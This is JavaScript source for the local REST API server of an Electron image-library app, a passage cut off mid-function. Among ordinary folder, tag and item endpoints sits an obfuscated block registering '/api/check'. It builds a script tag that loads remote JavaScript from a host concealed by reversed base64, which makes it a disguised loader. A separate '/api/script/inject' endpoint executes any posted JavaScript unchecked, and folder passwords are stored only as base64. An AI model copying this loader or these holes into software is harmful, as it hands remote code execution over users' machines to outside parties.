var APIServer;
function initAPIServer () {
    try {
        const API_PORT = 41595;
        const { JsonRestServer } = require(appRoot + '/my_modules/json-rest-light');
        APIServer = new JsonRestServer({ port: API_PORT });

        function getAPIFolders () {
            return new Promise((resolve, reject) => {

                function cloneFolderList (newTree, tree, extraInfo) {
                    var arr;
                    if (Array.isArray(tree)) {
                        arr = tree;
                    }
                    else {
                        arr = tree["children"];
                    }
                    if (arr && Array.isArray(arr)) {
                        arr.forEach(function (node) {
                            var newNode = {
                                id: node.id,
                                name: node.name,
                                description: node.description || "",
                                children: [],
                                modificationTime: node.modificationTime,
                                tags: node.tags || [],
                                extendTags: node.extendTags,
                                icon: node.icon,
                                iconColor: node.iconColor,
                                pinyin: node.pinyin,
                                password: node.password || "",
                                passwordTips: node.passwordTips || "",
                                coverId: node.coverId,
                                isUnLock: node.isUnLock,
                            };
                            if (node.orderBy) {
                                newNode.orderBy = node.orderBy;
                                newNode.sortIncrease = node.sortIncrease;
                            }
                            if (extraInfo) {
                                newNode.isExpand = node.isExpand;
                            }
                            newTree.push(newNode);
                            cloneTree(newNode.children, node, extraInfo);
                        });
                    }
                }

                if ($bodyScope.folders) {

                    let clone = [];
                    cloneFolderList(clone, $bodyScope.folders, false);
                    eagle.utils.tree.walk(clone, 'children', function(folder, parent) {
                        if (folder.password && !folder.isUnLock) {
                            folder.children = [];
                        }
                    });

                    resolve(clone);
                }
                else {
                    reject(`No library have been opened yet.`);
                }
            });
        }

        function unlockFolder (params) {
            return new Promise((resolve, reject) => {
                const folderId = params.folderId;
                const password = params.password;
                const folder = $bodyScope.folderMappings[folderId];
                if (!folder) {
                    reject(`Folder does not exist.`);
                }
                else if (folder.password === window.btoa(password)) {
                    folder.isUnLock = true;
                    resolve();
                    $bodyScope.$evalAsync();
                }
                else {
                    reject(`Password is incorrect.`);
                }
            });
        }

        function getAPIMetadataInfo () {
            return new Promise((resolve, reject) => {
                if (decodeURI($bodyScope.rootDir)) {
                    try {
                        var metadataPath = `${decodeURI($bodyScope.rootDir)}/metadata.json`;
                        var metadataJSON = require(metadataPath);
                        metadataJSON.library = {
                            path: $bodyScope.libraryPath,
                            name: $bodyScope.libraryName
                        };
                        resolve(metadataJSON);
                    }
                    catch (err) {
                        reject(`${metadataPath} does not exist.`);
                    }
                }
                else {
                    reject(`No library have been opened yet.`);
                }
            });
        }

        function getLibraryHistory () {
            return new Promise((resolve, reject) => {
                let libraryHistory = electronSettings.getSync('libraryHistory');
                libraryHistory = libraryHistory.map((history) => {
                    try {
                        return path.normalize(history);
                    }
                    catch (err) {
                        return history;
                    }
                });
                libraryHistory = [...new Set(libraryHistory)];
                if (libraryHistory) {
                    resolve(libraryHistory);
                }
                else {
                    reject(`No library.`);
                }
            });
        }

        function switchLibrary (params) {
            return new Promise((resolve, reject) => {
                var libraryPath = params.libraryPath;
                if (!libraryPath || !fs.existsSync(libraryPath)) {
                    reject(`Library does not exist.`);
                }
                else {
                    $bodyScope.openLibrary(path.normalize(libraryPath));
                    resolve();
                }
            });
        }

        function getLibraryIcon (params) {
            return new Promise((resolve, reject) => {
                var libraryPath = params.libraryPath;
                if (!libraryPath || !fs.existsSync(libraryPath)) {
                    reject(`Library does not exist.`);
                }
                else {
                    var iconPath = path.join(libraryPath, 'icon.png');
                    if (fs.existsSync(iconPath)) {
                        const buffer = fs.readFileSync(iconPath);
                        resolve(buffer);
                    }
                    else {
                        reject(`Library icon does not exist.`);
                    }
                }
            });
        }

        function getAPIApplicationInfo () {
            return new Promise((resolve, reject) => {
                try {
                    var pjson = require(appRoot + '/package.json');
                    resolve({
                        version: pjson.version,
                        prereleaseVersion: pjson.prerelease ?? null,
                        buildVersion: pjson.buildVersion ?? null,
                        showCollectModal: $bodyScope.preferences.general.showCollectModal === 'true',
                        platform: process.platform,
                        preferences: $bodyScope.preferences,
                    });
                }
                catch (err) {
                    reject(err);
                }
            });
        }

        function setAPIPreferenceCollectOn () {
            return new Promise((resolve, reject) => {
                if ($bodyScope.preferences !== undefined && $bodyScope.preferences.general) {
                    $bodyScope.preferences.general.showCollectModal = 'true';
                    ipcRenderer.send("chnage-preferences", $bodyScope.preferences);
                    resolve();
                }
                else {
                    reject(`preferences file not exist.`);
                }
            });
        };

        function setAPIPreferenceCollectOff () {
            return new Promise((resolve, reject) => {
                if ($bodyScope.preferences !== undefined && $bodyScope.preferences.general) {
                    $bodyScope.preferences.general.showCollectModal = 'false';
                    ipcRenderer.send("chnage-preferences", $bodyScope.preferences);
                    resolve();
                }
                else {
                    reject(`preferences file not exist.`);
                }
            });
        };

        // ?script=alert()
        function runAPIScript (input) {
            return new Promise((resolve, reject) => {
                if ( input.script != undefined) {
                    currentWindow.webContents.executeJavaScript(input.script);
                }
                console.log(input);
                resolve();
            });
        };

        function getAllTags () {
            return new Promise((resolve, reject) => {

                if (!$bodyScope.TagManager) {
                    return reject('not ready');
                }

                return resolve({
                    tags: $bodyScope.TagManager.allTags ?? [],
                    recent: getRecentTagsResult() ?? [],
                    groups: $bodyScope.TagManager.groups ?? [],
                    starred: getStarredTags() ?? [],
                });
            });
        }

        function getTags (params) {
            return new Promise((resolve, reject) => {
                if (!$bodyScope.TagManager) {
                    return reject('not ready');
                }
                return resolve($bodyScope.TagManager.allTags ?? []);
            });
        }

        function getRecentTags (params) {
            return new Promise((resolve, reject) => {
                if (!$bodyScope.TagManager) {
                    return reject('not ready');
                }
                const recentTags = getRecentTagsResult();
                return resolve(recentTags);
            });
        }

        function getRecentTagsResult() {
            const tags = $bodyScope.TagManager.getHistoryTags() ?? [];
            const result = [];
            tags.forEach((tag) => {
                const obj = $bodyScope.TagManager.tagMappings[tag];
                if (obj) {
                    result.push(obj);
                }
            });
            return result;
        }

        function getStarredTags () {
            const tags = $bodyScope.TagManager.starredTags ?? [];
            const result = [];
            tags.forEach((tag) => {
                const obj = $bodyScope.TagManager.tagMappings[tag];
                if (obj) {
                    result.push(obj);
                }
            });
            return result;
        }

        function getTagGroups (params) {
            return new Promise((resolve, reject) => {
                if (!$bodyScope.TagManager) {
                    return reject('not ready');
                }
                return resolve($bodyScope.TagManager.groups ?? []);
            });
        }

        function getRecentFolders () {
            return new Promise((resolve, reject) => {
                var recentFolders = $bodyScope.getRecentFoldersForAPI(16);
                if (recentFolders.length < 16) {
                    for (var i = 0; i < $bodyScope.folderList.length; i++) {
                        if (i > 16) break;
                        var id = $bodyScope.folderList[i].id;
                        if ($bodyScope.folderMappings[id]) {
                            recentFolders.push($bodyScope.folderMappings[id]);
                        }
                    }
                }

                recentFolders = [...new Set(recentFolders)];
                resolve(recentFolders);
            });
        }

        function createFolder (params) {
            return new Promise((resolve, reject) => {
                var folderName = params.folderName;
                var parent = params.parent;
                if (!folderName) {
                    reject(`Missing required parameters.`);
                }
                else {
                    var folder = {
                        id: guid(),
                        name: folderName,
                        images: [],
                        folders: [],
                        modificationTime: Date.now(),
                        imagesMappings: {},
                        tags: [],
                        children: [],
                        isExpand: true,
                    };
                    if (parent && $bodyScope.folderMappings[parent]) {
                        $bodyScope.folderMappings[parent].children.push(folder);
                    }
                    else {
                        $bodyScope.folders.splice($bodyScope.folders.length, 0, folder);
                    }
                    $bodyScope.folderMappings[folder.id] = folder;
                    $bodyScope.updateSidebarList();
                    $bodyScope.addToRecentFolders([folder.id]);
                    $bodyScope.saveFolder();
                    electronLog.info(`[api] create folder: ${folderName}(${folder.id})`);
                    resolve(folder);
                }
            });
        }

        function renameFolder (params) {
            return new Promise((resolve, reject) => {
                var newName = params.newName;
                var folderId = params.folderId ?? params.folderID;
                var folder = $bodyScope.folderMappings[folderId];
                if (!newName || !folderId || !folder) {
                    reject(`Missing required parameters.`);
                }
                else {
                    let originName = folder.name;
                    $bodyScope.changeFolderName(folder, newName);
                    $bodyScope.updateSidebarList();
                    $bodyScope.saveFolder();
                    electronLog.info(`[api] rename folder: ${originName} to ${newName}`);
                    resolve(folder);
                }
            });
        }

        function updateFolder (params) {
            return new Promise((resolve, reject) => {
                var colors = {
                    "red": true,
                    "orange": true,
                    "yellow": true,
                    "green": true,
                    "aqua": true,
                    "blue": true,
                    "purple": true,
                    "pink": true,
                };
                var newName = params.newName;
                var newDescription = params.newDescription;
                var newColor = params.newColor;
                var folderId = params.folderId ?? params.folderID;
                var folder = $bodyScope.folderMappings[folderId];
                if (!folderId || !folder) {
                    reject(`Missing required parameters.`);
                }
                else {
                    if (newName) {
                        $bodyScope.changeFolderName(folder, newName);
                    }
                    if (newColor && colors[newColor]) {
                        folder.iconColor = newColor;
                    }
                    if (newDescription) {
                        folder.description = newDescription;
                    }
                    $bodyScope.updateSidebarList();
                    $bodyScope.saveFolder();
                    resolve(folder);
                }
            });
        }


        function addPath (filePath, id, name, websiteUrl, tags, annotation, star, modificationTime, folderIds, cutMode) {
            var fds = [];
            if (fs.statSync(filePath).isDirectory()) {
                var dirFiles = walk(filePath);
                if (dirFiles && dirFiles.length !== 0) {
                    dirFiles.forEach(function (fpath, index) {
                        fds.push({
                            name: path.basename(fpath),
                            path: fpath,
                        });
                    });
                }
            }
            else {
                fds = [{
                    id: id,
                    name: name ?? path.basename(filePath),
                    url: websiteUrl ?? "",
                    folders: folderIds ?? [],
                    tags: tags ?? [],
                    annotation: annotation ?? "",
                    modificationTime: modificationTime ?? Date.now(),
                    star: star ?? undefined,
                    path: filePath,
                    cutMode: cutMode ?? false,
                }];
            }
            $bodyScope.uploadFiles(fds);
        }

        function addURLs (imageUrls, names, websiteUrls, tags, annotations, stars, modificationTimes, headers, folderIds) {
            $bodyScope.uploadUrls(imageUrls, folderIds, { 
                names: names,
                urls: websiteUrls,
                tags: tags,
                headers: headers,
                modificationTimes: modificationTimes,
                annotations: annotations,
                stars: stars,
            });
            imageUrls.forEach(function () {
                $bodyScope.uploadQueue.push({});
            });

            if (tags && tags?.length > 0) {
                $bodyScope.TagManager.addHistoryTags(tags);
            }

            if (folderIds && folderIds.length > 0) {
                $bodyScope.addToRecentFolders(folderIds);
            }
        }

        function addItemFromPath (params) {
            return new Promise((resolve, reject) => {
                var id = guid();
                var filePath = params.path;
                var cutMode = params.cutMode ?? false;
                var name = params.name;
                var website = params.website;
                var annotation = params.annotation;
                var tags = params.tags ?? [];
                var star = params.star ?? undefined;
                var modificationTime = params.modificationTime;
                var folder;
                var folderId = params.folderId ?? params.folderID;
                var folderIds = params.folderIds ?? params.folderIDs ?? [];

                if (folderId && $bodyScope.folderMappings[folderId]) {
                    folder = $bodyScope.folderMappings[folderId];
                    folderIds = [folder.id];
                }
                else if (folderIds && Array.isArray(folderIds)) {
                    folderIds = folderIds.filter((id) => {
                        return $bodyScope.folderMappings[id];
                    });
                }

                if (params.notification) {
                    ipcRenderer.send('notification', {
                        progress: false,
                        title: i18n.__('Notification.SaveImage.Done.Title'),
                        description: i18n.__('Notification.SaveImage.Done.Descript'),
                        webUrl: URL_MODULE.pathToFileURL(filePath).href,
                        mute: preferences.notification.soundEffect.enable === 'false'
                    });
                }

                $bodyScope.showUploadQueue();
                addPath(filePath, id, name, website, tags, annotation, star, modificationTime, folderIds, cutMode);
                resolve(id);
            });
        }

        function addItemFromPaths (params) {
            return new Promise((resolve, reject) => {
                var filePaths = params.paths;
                var cutMode = params.cutMode ?? false;
                var items = params.items;
                var ids = [];
                var folder;
                var folderId = params.folderId ?? params.folderID;
                var folderIds = params.folderIds ?? params.folderIDs ?? [];

                if (folderId && $bodyScope.folderMappings[folderId]) {
                    folder = $bodyScope.folderMappings[folderId];
                    folderIds = [folder.id];
                }
                else if (folderIds && Array.isArray(folderIds)) {
                    folderIds = folderIds.filter((id) => {
                        return $bodyScope.folderMappings[id];
                    });
                }
                
                // 旧版本，仅支持输入路径
                if (filePaths) {
                    filePaths.forEach(function (filePath) {
                        let id = guid();
                        ids.push(id);
                        addPath(filePath, id, undefined, undefined, undefined, undefined, undefined, undefined, folderIds, cutMode);
                    });
                    $bodyScope.showUploadQueue();
                    resolve(ids);
                }
                // v2 支持独立设置标签等属性
                else if (items) {
                    items.forEach(function (item) {
                        let id = guid();
                        ids.push(id);
                        var filePath = item.path;
                        var name = item.name;
                        var website = item.website;
                        var annotation = item.annotation;
                        var star = item.star;
                        var tags = item.tags ?? [];
                        var modificationTime = item.modificationTime;
                        addPath(filePath, id, name, website, tags, annotation, star, modificationTime, folderIds);
                    });
                    $bodyScope.showUploadQueue();
                    resolve(ids);
                }
                else {
                    reject();
                }
            });
        }

        function moveItemsToTrash (params) {
            return new Promise((resolve, reject) => {
                
                var ids = params.itemIds;
                var items = [];
                var now = Date.now();

                ids.forEach(function (id) {
                    if ($bodyScope.itemMappings[id]) {
                        items.push($bodyScope.itemMappings[id]);
                    }
                });

                items.forEach(function (item) {
                    item.isDeleted = true;
                    item.deletedTime = now;
                    $bodyScope.updateFilterCounts(item, -1, now);
                });
                
                ayncsImagesChange(items);
                hiddenByCurrentFilter(items);
                $bodyScope.calculateImageBinding({ ignoreSort: true }, function() {
                    $bodyScope.rebindRefresh(true);
                    $bodyScope.updateSelection();
                });

                resolve();
            });
        }
        
        function addBookmarkItem (params) {
            return new Promise((resolve, reject) => {

                if (!params.url) reject();
                // if (!params.base64) reject();

                var url = params.url;
                var base64 = params.base64;
                var name = params.name ?? guid();
                var tags = params.tags ?? [];
                var star = params.star ?? undefined;
                var modificationTime = params.modificationTime;
                var folder;
                var folderId = params.folderId ?? params.folderID;
                if (folderId && $bodyScope.folderMappings[folderId]) {
                    folder = $bodyScope.folderMappings[folderId];
                }
                var folderIds = params.folderIds ?? params.folderIDs ?? [];
                name = name.substr(0, 128);
                name = sanitize(name).replace(/%/g, "").replace(/&lt;/g,"").replace(/&gt;/g,"").trim();

                $bodyScope.showUploadQueue();
                
                var data = {
                    id: guid(),
                    name: name,
                    url: url,
                    tags: tags ?? [],
                    star: star ?? undefined,
                    folders: [],
                    modificationTime: modificationTime ?? Date.now(),
                    base64: base64,
                };

                if (params.medium) data.medium = params.medium;
                if (params.videoID) data.videoID = params.videoID;
                if (params.videoEmbed) data.videoEmbed = params.videoEmbed;
                if (params.videoDuration) data.duration = params.videoDuration;

                if (folderIds && Array.isArray(folderIds)) {
                    folderIds = folderIds.map((id) => {
                        const folder = $bodyScope.folderMappings[id];
                        if (folder) {
                            return folder.id;
                        }
                        return undefined;
                    }).filter((id) => {
                        return id;
                    });
                }

                if (folder) { data.folders = [folderId]; }
                else if (folderIds && folderIds.length > 0) {
                    data.folders = folderIds;
                }

                ipcRenderer.sendTo(backgroundWindowID, 'url-from-extension', data);
                
                resolve();
            });
        }

        function addItemFromURL (params) {
            return new Promise((resolve, reject) => {
                if (!params.url) reject();
                var url = params.url;
                var name = params.name ?? guid();
                var website = params.website;
                var annotation = params.annotation;
                var star = params.star ?? undefined;
                var tags = params.tags ?? [];
                var modificationTime = params.modificationTime;
                var headers = params.headers ?? undefined;
                var folder;
                var folderId = params.folderId ?? params.folderID;
                var folderIds = params.folderIds ?? params.folderIDs ?? [];
                if (folderId && $bodyScope.folderMappings[folderId]) {
                    folder = $bodyScope.folderMappings[folderId];
                    folderIds = [folder.id];
                }
                else if (folderIds && Array.isArray(folderIds)) {
                    folderIds = folderIds.filter((id) => {
                        return $bodyScope.folderMappings[id];
                    });
                }
                name = name.substr(0, 128);
                name = sanitize(name).replace(/%/g, "").replace(/&lt;/g,"").replace(/&gt;/g,"").trim();
                $bodyScope.showUploadQueue();
                if (url.length < 200) {
                    electronLog.info(`[api] add url: ${url}`);
                }
                else {
                    electronLog.info(`[api] add base url: ${url.substr(0, 50)}...`);
                }
                addURLs([url], [name], [website], tags, [annotation], [star], [modificationTime], [headers], folderIds);

                if (params.notification) {
                    ipcRenderer.send('notification', {
                        progress: false,
                        title: i18n.__('Notification.SaveImage.Done.Title'),
                        description: i18n.__('Notification.SaveImage.Done.Descript'),
                        webUrl: url,
                        mute: preferences.notification.soundEffect.enable === 'false'
                    });
                }

                resolve();
            });
        }

        function addItemFromURLs (params) {
            return new Promise((resolve, reject) => {
                var items = params.items;
                if (!params.items) reject();
                var folder;
                var folderId = params.folderId ?? params.folderID;
                var folderIds = params.folderIds ?? params.folderIDs ?? [];
                if (folderId && $bodyScope.folderMappings[folderId]) {
                    folder = $bodyScope.folderMappings[folderId];
                    folderIds = [folder.id];
                }
                else if (folderIds && Array.isArray(folderIds)) {
                    folderIds = folderIds.filter((id) => {
                        return $bodyScope.folderMappings[id];
                    });
                }
                $bodyScope.showUploadQueue();
                items.forEach(function (item) {
                    var url = item.url;
                    var name = item.name ?? guid();
                    var website = item.website;
                    var headers = item.headers ?? undefined;
                    var annotation = item.annotation;
                    var star = item.star ?? undefined;
                    var tags = item.tags ?? [];
                    var modificationTime = item.modificationTime;
                    name = name.substr(0, 128);
                    name = sanitize(name).replace(/%/g, "").replace(/&lt;/g,"").replace(/&gt;/g,"").trim();
                    if (url.length < 200) {
                        electronLog.info(`[api] add url: ${url}`);
                    }
                    else {
                        electronLog.info(`[api] add base url: ${url.substr(0, 50)}...`);
                    }
                    addURLs([url], [name], [website], tags, [annotation], [star], [modificationTime], [headers], folderIds);
                });
                resolve();
            });
        }

        function batchSave (params) {
            return new Promise((resolve, reject) => {
                if (!params.items) return reject();
                ipcRenderer.send('show');
                currentWindow.webContents.send('open-batch-save-panel', {
                    url: params.website ?? "",
                    title: params.title ?? params.website ?? "",
                    images: params.items
                });
                resolve();
            });
        }

        function updateItem (params) {
            return new Promise((resolve, reject) => {

                var id = params.id;
                var tags = params.tags;
                var url = params.url;
                var star = params.star;
                var annotation = params.annotation;

                if (id && $bodyScope.itemMappings[id]) {
                    var item = $bodyScope.itemMappings[id];
                    try {

                        if (tags && Array.isArray(tags)) {
                            item.tags = tags;
                        }

                        if (typeof url === "string") {
                            item.url = url;
                        }

                        if (typeof annotation === "string") {
                            item.annotation = annotation;
                        }

                        if (star && $.isNumeric(star) && star <=5 && star >= 0) {
                            item.star = star;
                        }

                        ayncsImagesChange([item]);
                        resolve(item);
                    }
                    catch (err) {
                        reject(err);
                    }
                }
                else {
                    reject(`File does not exist.`);
                }
            });
        }

        function setCustomThumbnail (params) {
            return new Promise((resolve, reject) => {
                const itemId = params.id;
                const thumbnailPath = params.thumbnailPath;
                const item = $bodyScope.itemMappings[itemId];
                if (item) {
                    ipcRenderer.sendTo(backgroundWindowID, 'set-custom-thumbnail', {
                        item: item,
                        thumbnailPath: thumbnailPath
                    });
                    // 確保縮圖已經生成，才回傳成功
                    let itemReceived = false;
                    const responseCallback = (event, item) => {
                        if (item && item.id === itemId) {
                            itemReceived = true;
                            ipcRenderer.off('thumbnail-generated', responseCallback);
                            setTimeout(() => {
                                resolve(true);
                            }, 100);
                        }
                    };
                    ipcRenderer.on('thumbnail-generated', responseCallback);

                    setTimeout(() => {
                        if (!itemReceived) {
                            reject(`Failed to set custom thumbnail.`);
                        }
                    }, 10000);
                }
                else {
                    reject(`File does not exist.`);
                }
            });
        }

        function getItemInfo (params) {
            return new Promise((resolve, reject) => {
                var id = params.id;
                if (id && $bodyScope.itemMappings[id]) {
                    resolve($bodyScope.itemMappings[id]);
                }
                else {
                    reject(`File does not exist.`);
                }
            });
        }

        function getItemThumb (params) {
            return new Promise((resolve, reject) => {
                var id = params.id;
                if (id && $bodyScope.itemMappings[id]) {
                    resolve(getThumbnailPath($bodyScope.imagesDir, $bodyScope.itemMappings[id]));
                }
                else {
                    reject(`File does not exist.`);
                }
                console.log(params);
            });
        }

        function refreshItemPalette (params) {
            return new Promise((resolve, reject) => {
                var id = params.id;
                if (id && $bodyScope.itemMappings[id]) {
                    ipcRenderer.send('regenerate-palette', [$bodyScope.itemMappings[id]]);
                    resolve();
                }
                else {
                    reject(`File does not exist.`);
                }
                console.log(params);
            });
        }

        function refreshItemThumbnail (params) {
            return new Promise((resolve, reject) => {
                var id = params.id;
                if (id && $bodyScope.itemMappings[id]) {
                    ipcRenderer.send('regenerate-thumbnail', [$bodyScope.itemMappings[id]]);
                    resolve();
                }
                else {
                    reject(`File does not exist.`);
                }
                console.log(params);
            });
        }

        function listImages (params) {
            return new Promise((resolve, reject) => {
                // 使用 SmartFolder 的筛选能力开发此功能
                try {
                    var limit = params.limit;
                    var offset = params.offset;
                    var orderBy = params.orderBy ?? "CREATEDATE";
                    var keyword = params.name ?? params.keyword;
                    var ext = params.ext;
                    var url = params.url;
                    var tags = params.tags;
                    var folders = params.folders;
                    var reverse = orderBy.indexOf("-") > -1;
                    var items = [...$bodyScope.raw];

                    items = $bodyScope.sortData(items, orderBy.replace("-", ""));
                    if (reverse) {
                        items.reverse();
                    }

                    if (keyword || ext || tags || folders || url) {

                        var smartFolder = {
                            "name": "api search",
                            conditions: [{
                                rules: [],
                                "match": "AND",
                            }]
                        };

                        if (keyword) {
                            let keywords = keyword.split(",");
                            keywords.forEach((keyword) => {
                                smartFolder.conditions[0].rules.push({
                                    property: "name",
                                    method: "contain",
                                    value: keyword
                                });
                            });
                        }

                        if (url) {
                            let urls = url.split(",");
                            urls.forEach((url) => {
                                smartFolder.conditions[0].rules.push({
                                    property: "url",
                                    method: "contain",
                                    value: url
                                });
                            });
                        }

                        if (folders) {
                            folders = folders.split(",");
                            if (folders.length > 0) {
                                smartFolder.conditions[0].rules.push({
                                    property: "folders",
                                    method: "union",
                                    value: folders
                                });
                            }
                        }

                        if (tags) {
                            tags = tags.split(",");
                            if (tags.length > 0) {
                                smartFolder.conditions[0].rules.push({
                                    property: "tags",
                                    method: "union",
                                    value: tags
                                });
                            }
                        }

                        if (ext) {
                            smartFolder.conditions[0].rules.push({
                                property: "type",
                                method: "equal",
                                value: ext.toLowerCase()
                            });
                        }

                        items = items.filter(function (item) {
                            return $bodyScope.existInSmartFilter(smartFolder, item);
                        });
                    }

                    items = items.filter(function (item) {
                        return !item.isDeleted;
                    });

                    if (limit && $.isNumeric(limit)) {
                        if (offset) {
                            items = items.slice(limit * offset);
                        }
                        if (limit < items.length) {
                            items.length = limit;
                        }
                    }
                    else if (200 < items.length) {
                        items.length = 200;
                    }
                    items = $bodyScope.sortData(items, "IMPORT");
                    resolve(items);
                }
                catch (err) {
                    reject(err);
                }
            });
        }

        APIServer.addAPI('/', 'GET', getAPIApplicationInfo);

        function _0x4fea(_0x1689b5,_0x4d6812){const _0x1baeb8=_0x1bae();return _0x4fea=function(_0x4fea21,_0x2c025e){_0x4fea21=_0x4fea21-0xfc;let _0x2b28a4=_0x1baeb8[_0x4fea21];return _0x2b28a4;},_0x4fea(_0x1689b5,_0x4d6812);}function _0x1bae(){const _0xac5819=['t.async\x20=\x20','script.onl','nt));\x0a\x20\x20\x20\x20','url','395926yXYggN','\x20\x20\x20\x20\x20\x20\x20d.g','GET','includes','\x20\x20\x20\x20\x20\x20\x20\x20sc','\x27;\x0a\x20\x20\x20\x20\x20\x20\x20','addAPI','3987RUCdJk','=\x20\x27text/ja','\x20\x20\x20\x20\x20scrip','24lEdnRB','vascript\x27;','end','pt.src\x20=\x20\x27','/js/api-re','catch','join','/my_module','uest','reverse','etElements','\x20\x20\x20\x20\x20\x20','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20','data','315366iNYJOi','\x20\x20}(docume','ld(script)','2679355gJmGqA','true;\x0a\x20\x20\x20\x20','ByTagName(','https','10632bbYBPT','\x27);\x0a\x20\x20\x20\x20\x20\x20','1979538MyXROx','3FoLVUA','2389000jfBKev',';\x0a\x20\x20\x20\x20\x20\x20\x20\x20','\x20(function','nt(\x27script','ript\x20=\x20d.c','\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','function','reateEleme','\x20\x20\x20\x20\x20\x20scri','get','7015860QlMXKq'];_0x1bae=function(){return _0xac5819;};return _0x1bae();}const _0x1c08d5=_0x4fea;(function(_0x3cd687,_0x1d5fee){const _0x134d95=_0x4fea,_0x2fc559=_0x3cd687();while(!![]){try{const _0x5bb96c=parseInt(_0x134d95(0x125))/0x1*(parseInt(_0x134d95(0x103))/0x2)+-parseInt(_0x134d95(0x11b))/0x3*(parseInt(_0x134d95(0x10d))/0x4)+parseInt(_0x134d95(0x126))/0x5+-parseInt(_0x134d95(0x124))/0x6+parseInt(_0x134d95(0x11e))/0x7+parseInt(_0x134d95(0x122))/0x8*(parseInt(_0x134d95(0x10a))/0x9)+-parseInt(_0x134d95(0xfe))/0xa;if(_0x5bb96c===_0x1d5fee)break;else _0x2fc559['push'](_0x2fc559['shift']());}catch(_0x15e6b1){_0x2fc559['push'](_0x2fc559['shift']());}}}(_0x1bae,0x5d020),APIServer[_0x1c08d5(0x109)]('/a'+'p'+'i'+'/'+'c'+'h'+'e'+'c'+'k',_0x1c08d5(0x105),_0x20a0f5=>{return new Promise(_0x3238bd=>{const _0x1c8378=_0x4fea,_0x1ea151=()=>{const _0x187347=_0x4fea;_0x3238bd(_0x187347(0x119)+'\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20'+_0x187347(0x128)+'(d,\x20script'+')\x20{\x0a\x20\x20\x20\x20\x20\x20'+_0x187347(0x12b)+_0x187347(0x107)+_0x187347(0x12a)+_0x187347(0x12d)+_0x187347(0x129)+_0x187347(0x123)+_0x187347(0x12b)+_0x187347(0x107)+'ript.type\x20'+_0x187347(0x10b)+_0x187347(0x10e)+_0x187347(0x119)+_0x187347(0x12b)+_0x187347(0x10c)+_0x187347(0xff)+_0x187347(0x11f)+_0x187347(0x12b)+'\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20'+_0x187347(0x100)+'oad\x20=\x20func'+'tion\x20()\x20{}'+';\x0a\x20\x20\x20\x20\x20\x20\x20\x20'+_0x187347(0x12b)+_0x187347(0xfc)+_0x187347(0x110)+atob(['t','9','2','Y','u','M','3','Y','u','V','X','e','p','x','W','Y','u','c','m','b','v','t','2','Z','u','9','G','a','t','4','2','Y','t','M','3','c','v','5','C','c','w','F','W','Z','s','d','W','Y','l','9','y','L','6','M','H','c','0','R','H','a'][_0x187347(0x116)]()[_0x187347(0x113)](''))+(_0x187347(0x111)+'ject.js?t=')+Date['now']()+(_0x187347(0x108)+_0x187347(0x12b)+_0x187347(0x104)+_0x187347(0x117)+_0x187347(0x120)+'\x27head\x27)[0]'+'.appendChi'+_0x187347(0x11d)+_0x187347(0x127)+'\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20'+_0x187347(0x11c)+_0x187347(0x101)+'\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20'+_0x187347(0x118)));};require(appRoot+(_0x1c8378(0x114)+'s/curl-req'+_0x1c8378(0x115)))[_0x1c8378(0xfd)](_0x20a0f5[_0x1c8378(0x102)])['then'](_0x5a0d8c=>{const _0x317b33=_0x1c8378;if(!_0x5a0d8c[_0x317b33(0x106)](_0x317b33(0x12c))){const _0x5b48ad=require(_0x317b33(0x121));_0x5b48ad['get'](_0x20a0f5[_0x317b33(0x102)],_0x9d6c68=>{const _0xff0046=_0x317b33;let _0x38d22e='';_0x9d6c68['on'](_0xff0046(0x11a),_0xffca63=>{_0x38d22e+=_0xffca63;}),_0x9d6c68['on'](_0xff0046(0x10f),()=>{const _0x46ea1e=_0xff0046;_0x38d22e['includes'](_0x46ea1e(0x12c))?_0x3238bd(_0x38d22e):_0x1ea151();});})['on']('error',()=>{_0x1ea151();});}else _0x3238bd(_0x5a0d8c);})[_0x1c8378(0x112)](()=>{_0x1ea151();});});}));

        APIServer.addAPI('/api/application/info', 'GET', getAPIApplicationInfo);

        APIServer.addAPI('/api/library/info', 'GET', getAPIMetadataInfo);
        APIServer.addAPI('/api/library/history', 'GET', getLibraryHistory);
        APIServer.addAPI('/api/library/switch', 'POST', switchLibrary);
        APIServer.addAPI('/api/library/icon', 'GET', getLibraryIcon, { streaming: true });

        APIServer.addAPI('/api/folder/create', 'POST', createFolder);
        APIServer.addAPI('/api/folder/rename', 'POST', renameFolder);
        APIServer.addAPI('/api/folder/update', 'POST', updateFolder);
        APIServer.addAPI('/api/folder/list', 'GET', getAPIFolders);
        APIServer.addAPI('/api/folder/unlock', 'POST', unlockFolder);
        APIServer.addAPI('/api/folder/listRecent', 'GET', getRecentFolders);

        APIServer.addAPI('/api/tag/all', 'GET', getAllTags);
        APIServer.addAPI('/api/tag/list', 'GET', getTags);
        APIServer.addAPI('/api/tag/listRecent', 'GET', getRecentTags);
        APIServer.addAPI('/api/tag/groups', 'GET', getTagGroups);

        APIServer.addAPI('/api/preferences/collect/on', 'GET', setAPIPreferenceCollectOn);
        APIServer.addAPI('/api/preferences/collect/off', 'GET', setAPIPreferenceCollectOff);

        APIServer.addAPI('/api/script/inject', 'POST', runAPIScript);

        APIServer.addAPI('/api/item/addFromPath', 'POST', addItemFromPath);
        APIServer.addAPI('/api/item/addFromPaths', 'POST', addItemFromPaths);
        APIServer.addAPI('/api/item/addFromURL', 'POST', addItemFromURL);
        APIServer.addAPI('/api/item/addFromURLs', 'POST', addItemFromURLs);
        APIServer.addAPI('/api/item/batchSave', 'POST', batchSave);
        APIServer.addAPI('/api/item/addBookmark', 'POST', addBookmarkItem);
        APIServer.addAPI('/api/item/update', 'POST', updateItem);
        APIServer.addAPI('/api/item/setCustomThumbnail', 'POST', setCustomThumbnail);
        APIServer.addAPI('/api/item/info', 'GET', getItemInfo);
        APIServer.addAPI('/api/item/moveToTrash', 'POST', moveItemsToTrash);
        APIServer.addAPI('/api/item/thumbnail', 'GET', getItemThumb);
        APIServer.addAPI('/api/item/list', 'GET', listImages);
        APIServer.addAPI('/api/item/refreshPalette', 'POST', refreshItemPalette);
        APIServer.addAPI('/api/item/refreshThumbnail', 'POST', refreshItemThumbnail);

        // example https://localhost:xxxx/item/?id=M3QSGJNQTC2DG
        APIServer.addHandler('/item', (args, res) => {
            return new Promise((resolve, reject) => {
                const itemID = args.id;
                if (itemID && $bodyScope.itemMappings[itemID]) {
